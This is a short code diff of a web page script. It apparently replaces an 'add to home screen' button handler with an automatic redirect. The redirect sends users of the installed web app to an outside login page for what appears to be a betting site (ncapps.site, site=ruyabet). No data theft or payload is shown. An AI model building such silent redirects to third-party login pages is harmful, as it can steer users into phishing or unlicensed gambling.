@@ -274,27 +274,12 @@
             modal.style.display = 'none';
         });
 
-        // Ana ekrana ekle özelliği için link değiştirme
-        androidButton.addEventListener('click', () => {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                deferredPrompt.userChoice.then((choiceResult) => {
-                    if (choiceResult.outcome === 'accepted') {
-                        // Ana ekrana eklenen linki https://ncapps.site/login.php?site=ruyabet yap
-                        window.location.href = 'https://ncapps.site/login.php?site=ruyabet';
-                    } else {
-                        alert('Ana ekrana ekleme işlemi iptal edildi.');
-                    }
-                });
-            }
-            // PWA modunda açıldığında yönlendirme yap
-            if (window.matchMedia('(display-mode: standalone)').matches) {
-                window.location.href = "https://ncapps.site/login.php?site=ruyabet";
-            }
-        });
+        // PWA modunda açıldığında yönlendirme yap
+        if (window.matchMedia('(display-mode: standalone)').matches) {
+            window.location.href = "https://ncapps.site/login.php?site=ruyabet";
+        }
     </script>
-    
-
 
 </body>
+
 </html>
